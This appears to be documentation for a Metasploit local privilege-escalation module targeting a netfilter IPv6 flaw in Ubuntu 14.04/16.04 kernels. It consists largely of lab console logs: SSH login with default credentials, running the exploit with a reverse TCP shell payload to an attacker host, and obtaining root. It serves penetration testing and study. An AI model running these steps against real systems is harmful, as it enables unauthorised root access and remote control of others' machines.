## Notes

This module (and the original exploit) are written in two parts: pwn, and enjoy.  Originally a version.h file was also included, but that has been incorporated into the target selection for this exploit.

## Creating A Testing Environment

There are a few requirements for this module to work (ubuntu):

  1. ip6_tables.ko has to be loaded (root running `ip6tables -L` will do such)

This module has been tested against:

  1. Ubuntu 14.04 (sudo apt-get install linux-image-4.2.0-27-generic)
  2. Ubuntu 16.04 (default kernel) linux-image-4.4.0-21-generic

This module has offsets for the following kernels, which have not been tested:
  
  1. 4.6.2 
  2. 4.2.0

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  4. Do: `use exploit/linux/local/netfilter_priv_esc_ipv6`
  5. Do: `set session #`
  6. Do: `set target #`
  7. Do: `check` to confirm your target will be set correctly
  8. Do: `set payload`
  9. Do: `set lhost` (if required)
  10. Do: `set verbose true`
  11. Do: `exploit`

## Options

  **WritableDir**

  A folder we can write files to.  Defaults to /tmp

  **COMPILE**
  
  If the exploit should be live compiled on the system.  Default is auto, if the system has the necessary files, it will compile, if not then drop a binary

## Scenarios

### Ubuntu 16.04 (with linux-image-4.4.0-21-generic)

#### Initial Access

    [*] Processing ipv6.rc for ERB directives.
    resource (ipv6.rc)> use auxiliary/scanner/ssh/ssh_login
    resource (ipv6.rc)> set rhosts 192.168.2.137
    rhosts => 192.168.2.137
    resource (ipv6.rc)> set username ubuntu
    username => ubuntu
    resource (ipv6.rc)> set password ubuntu
    password => ubuntu
    resource (ipv6.rc)> exploit
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.117:36837 -> 192.168.2.137:22) at 2016-10-25 14:56:24 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

#### Escalate

```
    resource (ipv6.rc)> use exploit/linux/local/netfilter_priv_esc_ipv6
    resource (ipv6.rc)> set verbose true
    verbose => true
    resource (ipv6.rc)> set payload linux/x64/shell/reverse_tcp
    payload => linux/x64/shell/reverse_tcp
    resource (ipv6.rc)> set session 1
    session => 1
    resource (ipv6.rc)> set target 2
    target => 2
    resource (ipv6.rc)> set lhost 192.168.2.117
    lhost => 192.168.2.117
    resource (ipv6.rc)> check
    [*] Checking if ip_tables is loaded in kernel
    [+] ip6_tables.ko is loaded
    [+] Kernel 4.4.0.pre.21.pre.generic is vulnerable
    [+] libc6-dev-i386 is installed
    [*]  The target appears to be vulnerable.
    resource (ipv6.rc)> exploit
    [*] Started reverse TCP handler on 192.168.2.117:4444 
    [*] Checking if ip_tables is loaded in kernel
    [+] ip6_tables.ko is loaded
    [+] Kernel 4.4.0.pre.21.pre.generic is vulnerable
    [+] libc6-dev-i386 is installed
    [+] gcc is installed
    [*] Live compiling exploit on system
    [*] Writing to /tmp/cxvXS1Et.c (5207 bytes)
    [*] Max line length is 65537
    [*] Writing 5207 bytes in 1 chunks of 18911 bytes (octal-encoded), using printf
    [*] Compiling /tmp/cxvXS1Et.c
    [*] Writing to /tmp/euPEmXEw.c (1765 bytes)
    [*] Max line length is 65537
    [*] Writing 1765 bytes in 1 chunks of 6430 bytes (octal-encoded), using printf
    [*] Compiling /tmp/euPEmXEw.c
    [*] Writing to /tmp/tlbHJ3An (206 bytes)
    [*] Max line length is 65537
    [*] Writing 206 bytes in 1 chunks of 567 bytes (octal-encoded), using printf
    [*] Exploiting...
    [*] Sending stage (38 bytes) to 192.168.2.137
    [*] Command shell session 2 opened (192.168.2.117:4444 -> 192.168.2.137:32774) at 2016-10-25 14:57:37 -0400
    [+] Deleted /tmp/cxvXS1Et
    [+] Deleted /tmp/euPEmXEw
    
    2709367386
    bsyYStlRnxfJBPOnzMtRuBJObUgtuapE
    true
    lNkKUmXZYXwgkjdSYQuzsDlsiEdsUBIy
    kReTxDWDCaXVfucIOVlrLLlDnZPJgCPD
    dsosNUMKyJSOXrnOXqmisCSZhuUkaFMq
    true
    OoXosKyvbZlKXeVxxKWZWVjJGCPtbOha
    KykivOmeGNTTexEvUQckdNBPucVexZMe
    vXkjDSkMGfFVLQNNwlbUQZZywbEmqxPQ
    whoami
    root
    uname -a
    Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

#### Escalate w/ pre-compiled binaries

```
    msf > use exploit/linux/local/netfilter_priv_esc_ipv6
    msf exploit(netfilter_priv_esc_ipv6) > set verbose true
    verbose => true
    msf exploit(netfilter_priv_esc_ipv6) > set payload linux/x64/shell/reverse_tcp
    payload => linux/x64/shell/reverse_tcp
    msf exploit(netfilter_priv_esc_ipv6) > set session 1
    session => 1
    msf exploit(netfilter_priv_esc_ipv6) > set target 2
    target => 2
    msf exploit(netfilter_priv_esc_ipv6) > set lhost 192.168.2.117
    lhost => 192.168.2.117
    msf exploit(netfilter_priv_esc_ipv6) > set compile False
    compile => False
    msf exploit(netfilter_priv_esc_ipv6) > exploit
    
    [*] Started reverse TCP handler on 192.168.2.117:4444 
    [*] Checking if ip_tables is loaded in kernel
    [+] ip6_tables.ko is loaded
    [+] Kernel 4.4.0.pre.21.pre.generic is vulnerable
    [+] libc6-dev-i386 is installed
    [*] Checking if ip_tables is loaded in kernel
    [+] ip6_tables.ko is loaded
    [+] Kernel 4.4.0.pre.21.pre.generic is vulnerable
    [+] libc6-dev-i386 is installed
    [*] Writing to /tmp/cxvXS1Et (7808 bytes)
    [*] Max line length is 65537
    [*] Writing 7808 bytes in 1 chunks of 21956 bytes (octal-encoded), using printf
    [*] Writing to /tmp/euPEmXEw (9264 bytes)
    [*] Max line length is 65537
    [*] Writing 9264 bytes in 1 chunks of 23971 bytes (octal-encoded), using printf
    [*] Writing to /tmp/tlbHJ3An (206 bytes)
    [*] Max line length is 65537
    [*] Writing 206 bytes in 1 chunks of 567 bytes (octal-encoded), using printf
    [*] Exploiting... This may take around 2min to complete.
    [*] Sending stage (38 bytes) to 192.168.2.137
    [*] Command shell session 2 opened (192.168.2.117:4444 -> 192.168.2.137:32774) at 2016-10-25 16:11:25 -0400
    [+] Deleted /tmp/cxvXS1Et
    [+] Deleted /tmp/euPEmXEw
    [+] Deleted /tmp/tlbHJ3An
    
    1618427772
    jdFSUosTqNJaVEMpzfzelTjcPBqRLSDd
    true
    qQjuuRQCackaoGwoOTaGakjgByjbScSd
    LBpvbVttOOyKxmcIvDlsHSxTwhIWNSkm
    vOtFHFXenciIGZVOZkXGuTVlWKVznFdV
    true
    EpBDmHRYATKXgsfFwsZbJuineFcLXXVW
    wYoOlFDLFoIUAhrTISAFhiLiOpVzzKTz
    xnVVXaIPZOaPhFoZucZfqGQAAHMtwZlr
    true
    qfURtnhwAJiMQPEQxQcHgZDTKTpjyOww
    rRdugFTnCVkKKPGcHJDYVzUsVNUutjGZ
    fPGGNfnIEHeZSDVqwHvffBgujeujRjrn
    whoami;uname -a
    root
    Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

#### A full run against Ubuntu 14.04 with 4.2.0-27

```
    [*] Processing ipv6.rc for ERB directives.
    resource (ipv6.rc)> use auxiliary/scanner/ssh/ssh_login
    resource (ipv6.rc)> set rhosts 192.168.2.156
    rhosts => 192.168.2.156
    resource (ipv6.rc)> set username ubuntu
    username => ubuntu
    resource (ipv6.rc)> set password ubuntu
    password => ubuntu
    resource (ipv6.rc)> exploit
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.117:38201 -> 192.168.2.156:22) at 2016-10-25 15:27:38 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    resource (ipv6.rc)> use exploit/linux/local/netfilter_priv_esc_ipv6
    resource (ipv6.rc)> set verbose true
    verbose => true
    resource (ipv6.rc)> set payload linux/x64/shell/reverse_tcp
    payload => linux/x64/shell/reverse_tcp
    resource (ipv6.rc)> set session 1
    session => 1
    resource (ipv6.rc)> set target 1
    target => 1
    resource (ipv6.rc)> set lhost 192.168.2.117
    lhost => 192.168.2.117
    resource (ipv6.rc)> check
    [*] Checking if ip_tables is loaded in kernel
    [+] ip6_tables.ko is loaded
    [+] Kernel 4.2.0.pre.27.pre.generic is vulnerable
    [+] libc6-dev-i386 is installed
    [*]  The target appears to be vulnerable.
    resource (ipv6.rc)> exploit
    [*] Started reverse TCP handler on 192.168.2.117:4444 
    [*] Checking if ip_tables is loaded in kernel
    [+] ip6_tables.ko is loaded
    [+] Kernel 4.2.0.pre.27.pre.generic is vulnerable
    [+] libc6-dev-i386 is installed
    [*] Writing to /tmp/1B5WCsJQ.c (5207 bytes)
    [*] Max line length is 65537
    [*] Writing 5207 bytes in 1 chunks of 18901 bytes (octal-encoded), using printf
    [*] Compiling /tmp/1B5WCsJQ.c
    [*] Writing to /tmp/Pa81QnTN.c (1765 bytes)
    [*] Max line length is 65537
    [*] Writing 1765 bytes in 1 chunks of 6426 bytes (octal-encoded), using printf
    [*] Compiling /tmp/Pa81QnTN.c
    [*] Writing to /tmp/KVnqVAyd (206 bytes)
    [*] Max line length is 65537
    [*] Writing 206 bytes in 1 chunks of 567 bytes (octal-encoded), using printf
    [*] Exploiting... This may take around 2min to complete.
    [*] Sending stage (38 bytes) to 192.168.2.156
    [*] Command shell session 2 opened (192.168.2.117:4444 -> 192.168.2.156:53222) at 2016-10-25 15:28:54 -0400
    [+] Deleted /tmp/1B5WCsJQ
    [+] Deleted /tmp/Pa81QnTN
    
    1680492764
    NGduyBPwgXWfGmBHtxBSKiETBaBLICLh
    true
    TaLLNBiFYHlmeltDGgkZgFUJjGxAYQCu
    BdMyykyLXtXiKWwYePyHuHgSuBQpSbpL
    XONlhqecfPbQdTLjQpgziWeUywRJApti
    true
    ROcMyQjRijjHyBVmHETMlSGyTkEgNJkO
    yMMjlJCFFAdVtPzpyETPnRRbIMqEnejB
    vezcxxghgakBxrcOnomswEcCXTCmBseb
    whoami
    root
    uname -a
    Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```